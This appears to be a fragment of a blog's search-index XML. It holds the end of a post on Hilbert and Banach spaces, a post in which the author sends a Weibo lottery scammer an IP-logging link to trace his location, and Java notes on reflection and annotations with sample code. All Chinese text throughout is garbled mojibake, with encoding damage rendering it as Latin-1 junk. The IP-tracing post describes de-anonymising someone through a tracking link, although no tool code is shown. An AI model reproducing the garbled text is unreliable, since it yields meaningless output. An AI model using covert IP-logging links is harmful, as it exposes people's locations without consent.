src="https://snowgo.top/medias/medias/%E5%85%B3%E4%BA%8E%E5%87%BD%E6%95%B0%E7%A9%BA%E9%97%B4%E7%9A%84%E7%AE%80%E5%8D%95%E7%90%86%E8%A7%A3/8.png">â€‹<br>ä»€ä¹ˆæ˜¯å®Œå¤‡æ€§ï¼Ÿ<br>å°±æ˜¯è¿™ä¸ªç©ºé—´åœ¨æé™è¿ç®—ä¸­ï¼Œå®ƒå–æé™ä¸èƒ½è·‘å‡ºå»ï¼Œå°±æ˜¯ç›¸å½“äºæˆ‘ä»¬åŸæ¥åšæé™çš„æ—¶å€™ï¼Œæœ‰ç†æ•°é›†ä¸è¡Œï¼Œä¸€å®šè¦åˆ°å®æ•°é›†<br>èµ‹èŒƒç©ºé—´ï¼šæ¯”å†…ç§¯è¦å°‘ä¸€ç‚¹ï¼Œå®ƒå®Œå¤‡çš„èµ‹èŒƒç©ºé—´å°±ç§°ä¸ºå·´æ‹¿èµ«ç©ºé—´</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>èŒƒæ•°å¯ä»¥å®šä¹‰â€œå¼ºåŒ–â€ äº†çš„è·ç¦»<br>å†…ç§¯æ˜¯è¾ƒè·ç¦»å’ŒèŒƒæ•°æœ‰æ›´å¤šå†…æ¶µ<br>å¸Œå°”ä¼¯ç‰¹ç©ºé—´ï¼šå…·æœ‰å®Œå¤‡æ€§çš„å†…ç§¯ç©ºé—´<br>å·´æ‹¿èµ«ç©ºé—´ï¼šå…·æœ‰å®Œå¤‡æ€§çš„èµ‹èŒƒç©ºé—´</p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è·å–å¾®åšæŠ½å¥–éª—å­çš„ipåœ°å€</title>
      <link href="/2021/10/01/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/"/>
      <url>/2021/10/01/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<p>å‘çƒ§äº†å¥½å‡ å¤©ï¼Œå¿ƒæƒ…ä¸å¤ªå¥½ï¼Œå°±æƒ³åœ¨å¾®åšä¸ŠæŠ½ç‚¹å¥–ç©ç©ï¼Œç»“æœå°±å‘ç°äº†ä¸€ä¸ªæ€§ä»·æ¯”æé«˜çš„ï¼š<br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/0.png"><br>æˆ‘ç«‹é©¬è½¬å‘<br>ç»“æœç¬¬äºŒå¤©æˆ‘ä¸€çœ‹ï¼Œ<br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/1.png"><br>è¿™æ˜¯æˆ‘ä¸­å¥–äº†å—ï¼Œæˆ‘ä¸­äº†iPhone13ï¼Ÿï¼Ÿï¼Ÿ<br>ç„¶åæˆ‘æ¥åˆ°ä»–ä¸»é¡µä¸€çœ‹ï¼š<br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/2.png"><br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/3.png"><br>å¥½å®¶ä¼™ä½ è¿™13è¿˜æ²¡å¼€å¥–å°±åˆæäº†ä¸ªæŠ½å¥–ï¼Œè¿˜æƒ³è®©æˆ‘å…ˆäº¤é’±ï¼Ÿæ¥çŸ¥ä¹çœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°å·²ç»æœ‰å¥½å¤šå—å®³è€…äº†ã€‚ï¼ˆ<br><a href="https://www.zhihu.com/question/437835565/answer/1827689954%EF%BC%89">https://www.zhihu.com/question/437835565/answer/1827689954ï¼‰</a><br>æˆ‘ç«‹é©¬ä¸¾æŠ¥ã€‚<br>éª—å­è¿™ä¹ˆåš£å¼ ï¼Œå¿…é¡»è¢«æ‰“å‡»æ‰“å‡»æ‰è¡Œå•Š<br>é‚£ä¹ˆç”¨ä¸ªç®€å•çš„å°å·¥å…·å‘é“¾æ¥æŸ¥æŸ¥éª—å­çš„ipåœ°å€å¥½äº†<br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/4.png"><br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/5.png"><br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/6.png"><br>éª—å­ç‚¹äº†ä¹‹åï¼Œä¸ºäº†å†éªŒè¯ä¸€ä¸‹ï¼Œæ¢äº†ä¸ªé“¾æ¥è®©éª—å­å†ç‚¹ä¸€æ¬¡<br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/7.png"></p><p><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/8.png"><br>éª—å­éå¸¸é¡ºåˆ©çš„ä¸Šé’©äº†<br>é‚£ä¹ˆå›¾ä¸­çš„ä¸¤ä¸ªç½‘é¡µé“¾æ¥å‘¢ï¼Œéª—å­æ¯ä¸ªéƒ½ç‚¹äº†ï¼Œè¿”å›çš„å€¼éƒ½å¯¹åº”ç€è¿™ä¸ªip</p><p><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/9.png"><br>â€‹</p><p><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/10.png"><br><img src="https://snowgo.top/medias/medias/%E8%8E%B7%E5%8F%96%E5%BE%AE%E5%8D%9A%E6%8A%BD%E5%A5%96%E9%AA%97%E5%AD%90%E7%9A%84ip%E5%9C%B0%E5%9D%80/11.png"><br>é‚£ä¹ˆå¤§æ¦‚å°±æ˜¯åœ¨è¿™é™„è¿‘äº†<br>æ‰€ä»¥ï¼Œèƒ½ä¸èƒ½æŠŠä»–ä»¬å…¨éƒ½æŠ“èµ·æ¥ï¼Ÿ</p>]]></content>
      
      
      <categories>
          
          <category> INTERESTING </category>
          
      </categories>
      
      
        <tags>
            
            <tag> interesting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaç¬”è®°-æ³¨è§£å’Œåå°„</title>
      <link href="/2021/09/14/Java%E7%AC%94%E8%AE%B0-%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/"/>
      <url>/2021/09/14/Java%E7%AC%94%E8%AE%B0-%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h2 id="12-åå°„æ“ä½œæ³›å‹"><a href="#12-åå°„æ“ä½œæ³›å‹" class="headerlink" title="12.åå°„æ“ä½œæ³›å‹"></a>12.åå°„æ“ä½œæ³›å‹</h2><p>Javaé‡‡ç”¨æ³›å‹æ“¦é™¤çš„æœºåˆ¶æ¥å¼•å…¥æ³›å‹,Javaä¸­çš„æ³›å‹ä»…ä»…æ˜¯ç»™ç¼–è¯‘å™¨javacä½¿ç”¨çš„,ç¡®ä¿æ•°æ®çš„å®‰å…¨æ€§å’Œå…å»å¼ºåˆ¶ç±»å‹è½¬æ¢é—®é¢˜ï¼Œä½†æ˜¯ï¼Œä¸€æ—¦ç¼–è¯‘å®Œæˆï¹æ‰€æœ‰å’Œæ³›å‹æœ‰å…³çš„ç±»å‹å‹å…¨éƒ¨æ“¦é™¤<br>ä¸ºäº†é€šè¿‡åå°„æ“ä½œè¿™äº›ç±»å‹,Javaæ–°å¢äº†ParameterizedType , GenericArrayType ,TypeVariableå’Œ Wildcardlype å‡ ç§ç±»å‹æ¥ä»£è¡¨ä¸èƒ½è¢«å½’ä¸€åˆ°Class ç±»ä¸­çš„ç±»å‹ï¼Œä½†æ˜¯åˆå’ŒåŸå§‹æ•°æ®ç±»å‹é½åçš„ç±»å‹ã€‚<br>1.ParameterizedTypeï¼š è¡¨ç¤ºä¸€ç§å‚æ•°åŒ–ç±»å‹ï¼Œæ¯”å¦‚Collection<br>2.GenericArrayType: è¡¨ç¤ºä¸€ç§å…ƒç´ ç±»å‹æ˜¯å‚æ•°åŒ–ç±»å‹æˆ–è€…ç±»å‹å˜é‡çš„æ•°ç»„ç±»å‹<br>3.TypeVariable: æ˜¯å„ç§ç±»å‹å˜é‡çš„å…¬å…±çˆ¶æ¥å£<br>4.WildcardType: ä»£è¡¨ä¸€ç§é€šé…ç¬¦ç±»å‹è¡¨è¾¾å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">package cn.bloghut.reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.ParameterizedType;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.<span class="type">Type</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.<span class="type">List</span>;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @author by é—²è¨€</span><br><span class="line"> * @classname Test11</span><br><span class="line"> * @description TODO</span><br><span class="line"> * @date <span class="number">2021</span>/<span class="number">7</span>/<span class="number">31</span> <span class="number">22</span>:<span class="number">59</span></span><br><span class="line"> */</span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Test11</span> &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">test01</span>(<span class="params">Map&lt;String, User&gt; <span class="built_in">map</span>, <span class="type">List</span>&lt;User&gt; <span class="built_in">list</span></span>) &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Map</span>&lt;<span class="title">String</span>, <span class="title">User</span>&gt; <span class="title">test02</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">null</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) <span class="title">throws</span> <span class="title">Exception</span> &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">Class</span>&lt;<span class="title">Test11</span>&gt; <span class="title">c1</span> = <span class="title">Test11</span>.<span class="title">class</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">Method</span> <span class="title">test01</span> = <span class="title">c1</span>.<span class="title">getMethod</span>(<span class="params"><span class="string">&quot;test01&quot;</span>, Map.<span class="keyword">class</span>, <span class="type">List</span>.<span class="keyword">class</span></span>);</span></span><br><span class="line"><span class="class">        //è·å–å‚æ•°çš„æ³›å‹å‚æ•°ç±»å‹</span></span><br><span class="line"><span class="class">        <span class="title">Type</span>[] <span class="title">genericParameterTypes</span> = <span class="title">test01</span>.<span class="title">getGenericParameterTypes</span>();</span></span><br><span class="line"><span class="class">        <span class="title">for</span> (<span class="params"><span class="type">Type</span> genericParameterType : genericParameterTypes</span>) &#123;</span></span><br><span class="line"><span class="class">            <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">genericParameterType</span>);</span></span><br><span class="line"><span class="class">            //åˆ¤æ–­è¿™ä¸ªæ³›å‹æ˜¯ä¸æ˜¯å‚æ•°åŒ–ç±»å‹</span></span><br><span class="line"><span class="class">            <span class="title">if</span> (<span class="params">genericParameterType instanceof ParameterizedType</span>)&#123;</span></span><br><span class="line"><span class="class">                <span class="title">Type</span>[] <span class="title">actualTypeArguments</span> = (<span class="params">(<span class="params">ParameterizedType</span>) genericParameterType</span>).<span class="title">getActualTypeArguments</span>();</span></span><br><span class="line"><span class="class">                <span class="title">for</span> (<span class="params"><span class="type">Type</span> actualTypeArgument : actualTypeArguments</span>) &#123;</span></span><br><span class="line"><span class="class">                    <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">actualTypeArgument</span>);</span></span><br><span class="line"><span class="class">                &#125;</span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params"><span class="string">&quot;===================================================================&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">Method</span> <span class="title">method</span> = <span class="title">c1</span>.<span class="title">getMethod</span>(<span class="params"><span class="string">&quot;test02&quot;</span></span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        <span class="title">Type</span> <span class="title">type</span> = <span class="title">method</span>.<span class="title">getGenericReturnType</span>();</span></span><br><span class="line"><span class="class">        <span class="title">if</span> (<span class="params"><span class="built_in">type</span> instanceof  ParameterizedType</span>)&#123;</span></span><br><span class="line"><span class="class">            <span class="title">Type</span>[] <span class="title">actualTypeArguments</span> = (<span class="params">(<span class="params">ParameterizedType</span>) <span class="built_in">type</span></span>).<span class="title">getActualTypeArguments</span>();</span></span><br><span class="line"><span class="class">            <span class="title">for</span> (<span class="params"><span class="type">Type</span> actualTypeArgument : actualTypeArguments</span>) &#123;</span></span><br><span class="line"><span class="class">                <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">actualTypeArgument</span>);</span></span><br><span class="line"><span class="class">            &#125;</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">//æ§åˆ¶å°æ‰“å°</span></span><br><span class="line"><span class="class"><span class="title">java</span>.<span class="title">util</span>.<span class="title">Map</span>&lt;<span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span>, <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span></span></span><br><span class="line"><span class="class"><span class="title">java</span>.<span class="title">util</span>.<span class="title">List</span>&lt;<span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span></span></span><br><span class="line"><span class="class">===================================================================</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">java</span>.<span class="title">lang</span>.<span class="title">String</span></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">cn</span>.<span class="title">bloghut</span>.<span class="title">reflection</span>.<span class="title">User</span></span></span><br></pre></td></tr></table></figure><h2 id="13-è·å–æ³¨è§£ä¿¡æ¯"><a href="#13-è·å–æ³¨è§£ä¿¡æ¯" class="headerlink" title="13.è·å–æ³¨è§£ä¿¡æ¯"></a>13.è·å–æ³¨è§£ä¿¡æ¯</h2><p>getAnnotation<br>getAnnotations<br>ç»ƒä¹ ï¼šORM<br>äº†è§£ä»€ä¹ˆæ˜¯ORMï¼Ÿ<br>Object relationship Mapping â€“ã€‹å¯¹è±¡å…³ç³»æ˜ å°„<br><img src="https://snowgo.top/medias/medias/Java%E7%AC%94%E8%AE%B0-%E6%B3%A8%E8%A7%A3%E5%92%8C%E5%8F%8D%E5%B0%84/16.png"><br>1.ç±»å’Œè¡¨ç»“æ„å¯¹åº”<br>2.å±æ€§å’Œå­—æ®µå¯¹åº”<br>3.å¯¹è±¡å’Œè®°å½•å¯¹åº”</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">package cn.bloghut.annotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">Test04</span>&#123;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">static</span> <span class="title">void</span> <span class="title">main</span>(<span class="params">String[] args</span>) <span class="title">throws</span> <span class="title">Exception</span>&#123;</span></span><br><span class="line"><span class="class">        //1.è·å–<span class="title">Class</span>ç±»å¯¹è±¡</span></span><br><span class="line"><span class="class">        <span class="title">Class</span>&lt;?&gt; <span class="title">c</span> = <span class="title">Class</span>.<span class="title">forName</span>(<span class="params"><span class="string">&quot;cn.bloghut.annotation.Student&quot;</span></span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        //2.é€šè¿‡åå°„è·å–æ³¨è§£</span></span><br><span class="line"><span class="class">        <span class="title">Annotation</span>[] <span class="title">annotations</span> = <span class="title">c</span>.<span class="title">getAnnotations</span>();</span></span><br><span class="line"><span class="class">        <span class="title">for</span> (<span class="params">Annotation annotation : annotations</span>) &#123;</span></span><br><span class="line"><span class="class">            <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">annotation</span>);</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        //è·å–æ³¨è§£çš„<span class="title">value</span>å€¼</span></span><br><span class="line"><span class="class">        <span class="title">TableXy</span> <span class="title">tableXy</span> = <span class="title">c</span>.<span class="title">getAnnotation</span>(<span class="params">TableXy.<span class="keyword">class</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">value</span> = <span class="title">tableXy</span>.<span class="title">value</span>();</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params">value</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">        //è·å–ç±»æŒ‡å®šçš„æ³¨è§£</span></span><br><span class="line"><span class="class">        //æš´åŠ›åå°„</span></span><br><span class="line"><span class="class">        <span class="title">Field</span> <span class="title">field</span> = <span class="title">c</span>.<span class="title">getDeclaredField</span>(<span class="params"><span class="string">&quot;name&quot;</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">FieldXy</span> <span class="title">fieldXy</span> = <span class="title">field</span>.<span class="title">getAnnotation</span>(<span class="params">FieldXy.<span class="keyword">class</span></span>);</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">columnName</span> = <span class="title">fieldXy</span>.<span class="title">columnName</span>();</span></span><br><span class="line"><span class="class">        <span class="title">String</span> <span class="title">type</span> = <span class="title">fieldXy</span>.<span class="title">type</span>();</span></span><br><span class="line"><span class="class">        <span class="title">int</span> <span class="title">length</span> = <span class="title">fieldXy</span>.<span class="title">length</span>();</span></span><br><span class="line"><span class="class">        <span class="title">System</span>.<span class="title">out</span>.<span class="title">println</span>(<span class="params"><span class="string">&quot;columnNameï¼š&quot;</span>+columnName+<span class="string">&quot;   typeï¼š&quot;</span>+<span class="built_in">type</span>+<span class="string">&quot;   lengthï¼š&quot;</span>+length</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">@<span class="title">TableXy</span>(<span class="params"><span class="string">&quot;db_student&quot;</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="class">    @<span class="title">FieldXy</span>(<span class="params">columnName = <span class="string">&quot;db_id&quot;</span>,<span class="built_in">type</span> = <span class="string">&quot;int&quot;</span>,length = <span class="number">18</span></span>)</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">int</span> <span class="title">id</span>;</span></span><br><span class="line"><span class="class">    @<span class="title">FieldXy</span>(<span class="params">columnName = <span class="string">&quot;db_age&quot;</span>,<span class="built_in">type</span> = <span class="string">&quot;int&quot;</span>,length = <span class="number">10</span></span>)</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">int</span> <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    @<span class="title">FieldXy</span>(<span class="params">columnName = <span class="string">&quot;db_name&quot;</span>,<span class="built_in">type</span> = <span class="string">&quot;varchar&quot;</span>,length = <span class="number">3</span></span>)</span></span><br><span class="line"><span class="class">    <span class="title">private</span> <span class="title">String</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">Student</span>() &#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    @<span class="title">Override</span></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">String</span> <span class="title">toString</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> &quot;<span class="title">Student</span>&#123;&quot; +</span></span><br><span class="line"><span class="class">                &quot;<span class="title">id</span>=&quot; + <span class="title">id</span> +</span></span><br><span class="line"><span class="class">                &quot;, <span class="title">age</span>=&quot; + <span class="title">age</span> +</span></span><br><span class="line"><span class="class">                &quot;, <span class="title">name</span>=&#x27;&quot; + <span class="title">name</span> + &#x27;\&#x27;&#x27; +</span></span><br><span class="line"><span class="class">                &#x27;&#125;&#x27;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">int</span> <span class="title">getId</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">id</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">setId</span>(<span class="params"><span class="built_in">int</span> <span class="built_in">id</span></span>) &#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">id</span> = <span class="title">id</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">int</span> <span class="title">getAge</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">setAge</span>(<span class="params"><span class="built_in">int</span> age</span>) &#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">age</span> = <span class="title">age</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">String</span> <span class="title">getName</span>() &#123;</span></span><br><span class="line"><span class="class">        <span class="title">return</span> <span class="title">name</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">void</span> <span class="title">setName</span>(<span class="params">String name</span>) &#123;</span></span><br><span class="line"><span class="class">        <span class="title">this</span>.<span class="title">name</span> = <span class="title">name</span>;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">//ç±»åçš„æ³¨è§£</span></span><br><span class="line"><span class="class">@<span class="title">Target</span>(<span class="params">value = &#123;ElementType.TYPE&#125;</span>)</span></span><br><span class="line"><span class="class">@<span class="title">Retention</span>(<span class="params">RetentionPolicy.RUNTIME</span>)</span></span><br><span class="line"><span class="class">@<span class="title">interface</span> <span class="title">TableXy</span>&#123;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    <span class="title">String</span> <span class="title">value</span>();</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">//å±æ€§çš„æ³¨è§£</span></span><br><span class="line"><span class="class">@<span class="title">Target</span>(<span class="params">value = &#123;ElementType.FIELD&#125;</span>)</span></span><br><span class="line"><span class="class">@<span class="title">Retention</span>(<span class="params">RetentionPolicy.RUNTIME</span>)</span></span><br><span class="line"><span class="class">@<span class="title">interface</span> <span 